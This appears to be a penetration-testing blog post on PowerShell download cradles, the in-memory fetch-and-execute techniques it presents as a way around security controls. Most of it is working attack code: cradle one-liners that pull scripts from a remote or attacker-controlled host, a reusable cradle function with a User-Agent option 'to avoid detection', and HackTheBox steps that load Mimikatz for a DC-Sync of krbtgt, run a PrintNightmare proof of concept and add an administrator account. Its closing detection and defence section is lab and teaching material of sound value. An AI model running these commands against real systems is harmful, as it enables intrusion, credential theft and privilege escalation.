+++
tags = ["Windows", "Active Directory", "PowerShell", "Download Cradle"]
draft = false
title = "Understanding PowerShell Download Cradles: A Deep Dive"
author = "bloodstiller"
date = 2024-11-11
+++

## Introduction {#introduction}

PowerShell has revolutionized system administration and automation. One of its powerful yet often misunderstood features is the PowerShell download cradle. This article explores what download cradles are, their uses, and best practices for implementation.


## What is a PowerShell Download Cradle? {#what-is-a-powershell-download-cradle}

A PowerShell download cradle is a technique that enables downloading and executing code directly in memory without writing to disk. This approach can help bypass security mechanisms.


## Core Components and Techniques {#core-components-and-techniques}


### Essential Cmdlets {#essential-cmdlets}

-   `Invoke-WebRequest`: Retrieves content from web pages
-   `Invoke-Expression` (alias: IEX): Executes PowerShell commands from strings
-   `System.Net.WebClient`: .NET class for web server interactions


### Basic Syntax Example using Invoke-Mimikatz: {#basic-syntax-example-using-invoke-mimikatz}

-   **Load Script into memory**:
    -   {{< figure src="/ox-hugo/2024-11-12-103931_.png" >}}

-   **Running Invoke-Mimikatz from memory**:
    -   {{< figure src="/ox-hugo/2024-11-12-104010_.png" >}}


## Common Download Cradle Examples: {#common-download-cradle-examples}


### Basic WebClient Method {#basic-webclient-method}

```powershell
# Standard WebClient download cradle
IEX (New-Object Net.Webclient).downloadstring("https://example.com/script.ps1")

# PowerShell 3.0+ using Invoke-WebRequest (alias: iwr)
IEX (iwr 'https://example.com/script.ps1')
```


### COM Object Methods {#com-object-methods}

```powershell
# Internet Explorer COM object
$ie = New-Object -comobject InternetExplorer.Application
$ie.visible = $False
$ie.navigate('https://example.com/script.ps1')
start-sleep -s 5
$r = $ie.Document.body.innerHTML
$ie.quit()
IEX $r

# Msxml2.XMLHTTP COM object (proxy-aware)
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','https://example.com/script.ps1',$false)
$h.send()
iex $h.responseText
```


### Advanced Download Cradle Techniques: {#advanced-download-cradle-techniques}

```powershell
# DNS TXT Record Method
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(
    ((nslookup -querytype=txt "example.com" | Select -Pattern '"*"') -split '"'[0])
)))

# XML Document Method
$a = New-Object System.Xml.XmlDocument
$a.Load("https://example.com/command.xml")
$a.command.a.execute | iex
```


## Creating a Secure Download Cradle: {#creating-a-secure-download-cradle}


### Basic Setup {#basic-setup}

1.  Launch PowerShell with appropriate privileges
2.  Configure execution policy if needed
    ```powershell
       Set-ExecutionPolicy RemoteSigned
    ```


### Secure Download Cradle Code: {#secure-download-cradle-code}

Here's a complete, production-ready download cradle implementation that incorporates logging, error handling, and security controls:

```powershell
function Invoke-SecureDownloadCradle {
    # Enable advanced function features like -Verbose
    [CmdletBinding()]
    param (
        # Required URL parameter for the script to download
        [Parameter(Mandatory=$true)]
        [string]$Url,

        # Optional custom User-Agent to avoid detection or meet requirements
        [Parameter(Mandatory=$false)]
        [string]$UserAgent = "PowerShell/SecurityAudit",

        # Optional timeout in milliseconds (default 30 seconds)
        [Parameter(Mandatory=$false)]
        [int]$Timeout = 30000,

        # Optional switch to enable Windows Event Log logging
        [Parameter(Mandatory=$false)]
        [switch]$EnableLogging
    )

    # Internal logging function to handle both event logs and verbose output
    function Write-Log {
        param($Message)

        if ($EnableLogging) {
            $logParams = @{
                LogName = 'Application'     # Write to Windows Application log
                Source = 'SecureDownloadCradle'
                EventId = 1000
                EntryType = 'Information'
                Message = $Message
            }

            try {
                Write-EventLog @logParams
            } catch {
                Write-Warning "Logging failed: $_"
            }
        }

        Write-Verbose $Message    # Always write to verbose stream
    }

    try {
        Write-Log "Starting download from: $Url"

        # Force TLS 1.2 for security and reset cert callback to default
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null

        # Initialize WebClient with security settings
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", $UserAgent)
        # Configure system proxy settings automatically
        $webClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
        $webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

        Write-Log "Downloading content..."
        $scriptContent = $webClient.DownloadString($Url)
        Write-Log "Content downloaded successfully"

        # Execute the downloaded content safely using InvokeCommand
        Write-Log "Executing script in memory"
        $ExecutionContext.InvokeCommand.InvokeScript($false, [scriptblock]::Create($scriptContent), $null, $null)
        Write-Log "Execution completed successfully"

    } catch [System.Net.WebException] {
        # Handle network-specific errors separately
        $errorMsg = "Network error occurred: $($_.Exception.Message)"
        Write-Log $errorMsg
        throw $errorMsg

    } catch {
        # Handle all other errors
        $errorMsg = "Unexpected error occurred: $_"
        Write-Log $errorMsg
        throw $errorMsg

    } finally {
        # Ensure proper cleanup of resources
        if ($webClient) {
            $webClient.Dispose()
            Write-Log "WebClient disposed"
        }
    }
}
```

**This implementation includes**:

-   Comprehensive error handling
-   Event logging (when enabled - requires admin privileges as requires REG change)
-   TLS 1.2 enforcement
-   Proper proxy handling
-   Certificate validation
-   Resource cleanup
-   Verbose output support


#### Example usage without logging: {#example-usage-without-logging}

```powershell

#Import Script
. .\Invoke-SecureDownloadCradle.ps1

#Run
Invoke-SecureDownloadCradle -Url "http://[IP]/[SCRIPT].ps1" -Verbose
```

-   {{< figure src="/ox-hugo/2024-11-12-100101_.png" >}}


#### Example usage with logging: {#example-usage-with-logging}

```powershell

#Import Script
. .\Invoke-SecureDownloadCradle.ps1

# Create Event Source
New-EventLog -LogName Application -Source "SecureDownloadCradle"

#Run
Invoke-SecureDownloadCradle -Url "http://[IP]/[SCRIPT].ps1" -Verbose

# Read the logs
Get-WinEvent -LogName Application | Where-Object {$_.ProviderName -eq "SecureDownloadCradle"}
```

-   {{< figure src="/ox-hugo/2024-11-12-100912_.png" >}}

-   +Notes+: A custom user agent can also be passed:
    -   `-UserAgent "CompanyName/UpdateService"`


## Real-World Examples Of Download-Cradle Use HackTheBox {#real-world-examples-of-download-cradle-use-hackthebox}

-   I will often use download cradles on hack the box and here are some recent examples:


### Monteverde Box: Extracting the Administrator Password for Azure: {#monteverde-box-extracting-the-administrator-password-for-azure}

-   +Full Walkthrough+: <https://bloodstiller.com/walkthroughs/monteverde-box/>

In this example, we used a download cradle to execute AdConnect exploitation directly in memory:

```powershell
iex(new-object net.webclient).downloadstring('http://10.10.14.46:9000/AdConnectPOC.ps1')
```

-   {{< figure src="/ox-hugo/2024-10-14-131101_.png" >}}
-   As the exploit is run in memory we get the administrators password without writing to disk.


### Certified Box: Advanced Mimikatz Usage to perform a DC-Sync Attack: {#certified-box-advanced-mimikatz-usage-to-perform-a-dc-sync-attack}

-   +Full Walkthrough+: <https://bloodstiller.com/walkthroughs/certified-box/> Coming soon (it's still in release arena. )
-   Note this is not a spoiler as this is done post exploitation.


#### Setting Up the Environment {#setting-up-the-environment}

1.  Start a Python HTTP server to host the Mimikatz script:
    ```bash
       python3 -m http.server 9000
    ```


#### Loading Mimikatz into Memory {#loading-mimikatz-into-memory}

Using a download cradle to load [invoke-mimikatz](https://github.com/g4uss47/Invoke-Mimikatz) directly into memory:

```powershell
iex(new-object net.webclient).downloadstring('http://10.10.14.24:9000/Invoke-Mimikatz.ps1')
```

-   {{< figure src="/ox-hugo/2024-11-10-134628_.png" >}}
-   +Note+: This will hang for a little bit, so just be patient.


#### Performing DC-Sync Attack {#performing-dc-sync-attack}

-   Now that mimikatz is loaded into memory we can use it like we normally would and pass it arguments.

<!--listend-->

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /user:krbtgt /domain:administrator.htb"'
```

-   {{< figure src="/ox-hugo/2024-11-10-135022_.png" >}}


### Driver Box: Running PrintNightmare POC from a download cradle: {#driver-box-running-printnightmare-poc-from-a-download-cradle}

-   +Full Walkthrough+: <https://bloodstiller.com/walkthroughs/driver-box/> Coming soon (it's still in release arena. )

-   **Start python server to host the script**:
    ```bash
       python3 -m http.server 9000
    ```

    -   {{< figure src="/ox-hugo/2024-11-11-135448_.png" >}}
    -   +Note+: I have this command aliased to `pws`

-   **Use the download cradle to load the POC directly into memory**:
    ```powershell
      iex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/CVE-2021-1675.ps1')
    ```

    -   {{< figure src="/ox-hugo/2024-11-11-135533_.png" >}}

-   **Execute the script from memory to create new user &amp; add them to the admins**:
    ```powershell
      Invoke-Nightmare -NewUser "bloodstiller" -NewPassword "bl00dst1ll3r!" -DriverName "PrintIt"
    ```

    -   {{< figure src="/ox-hugo/2024-11-11-135700_.png" >}}

-   **Verify the user has been added**:
    ```powershell
      net user bloodstiller
    ```

    -   {{< figure src="/ox-hugo/2024-11-11-135721_.png" >}}


## Security Considerations {#security-considerations}


### Detection Methods {#detection-methods}

-   **Modern security solutions detect download cradles through several means**:
    -   PowerShell logging and ScriptBlock logging
    -   Network traffic analysis (especially `.DownloadString` patterns)
    -   AMSI integration in PowerShell 5.0+
    -   EDR behavioral analysis
    -   Memory scanning for known patterns


### Common Restrictions {#common-restrictions}

-   **Organizations often implement**:

<!--listend-->

```powershell
# Execution Policy
Set-ExecutionPolicy Restricted

# AMSI Scanning
# Built into PowerShell 5.0+ by default

# AppLocker Rules
# Block PowerShell download cradle patterns
New-AppLockerPolicy -RuleType Path -Deny -Path "%SYSTEM32%\WindowsPowerShell\*\powershell.exe" -User Everyone
```


### Defensive Recommendations {#defensive-recommendations}

**For system administrators**:

1.  **Enable PowerShell logging**:
    ```powershell
       # Enable detailed script block logging
       Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
    ```

2.  **Monitor for suspicious patterns**:
    -   Direct execution using `IEX`
    -   Base64 encoded commands
    -   Uncommon COM objects
    -   Unusual DNS TXT queries

3.  **Network Controls**:
    -   Implement HTTPS inspection
    -   Block outbound PowerShell connections
    -   Monitor for unusual PowerShell network activity
